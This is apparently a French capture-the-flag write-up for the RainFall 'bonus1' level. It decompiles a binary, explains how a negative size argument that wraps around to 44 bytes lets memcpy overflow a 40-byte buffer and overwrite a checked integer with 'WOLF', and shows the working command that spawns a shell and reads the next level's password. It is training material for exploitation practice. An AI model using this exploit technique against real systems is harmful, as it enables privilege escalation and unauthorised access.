#### Etape 1 : Décompilation

Le programme prend 2 arguments, le premier doit être inférieur à 10 et si c'est le cas il effectue un memcpy du second argument. Puis si le premier argument est égale à 0x574f4c46 il éxécute un /bin/sh.

#### Etape 2 : Informations

La string du buffer destinaire dans le memcpy fait 40 bytes. L'adresse de number et string ce suivent.
Par expérience je sais que le INT_MIN - 1 = INT_MAX;
De plus la valeur attendu pour éxécuter le /bin/sh n'est autre que la chaine de caractères ***FLOW***.
#### Etape 3 : Idée

Le but sera donc d'avoir un nombre négatif qui fois 4 devient 44 pour permettre au memcpy de réecrire l'adresse qui suit.

#### Etape 4 : Execution 

```bash
bonus1@RainFall:~$ ./bonus1 -1073741812 $(python -c 'print "a"*40 +"WOLF"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
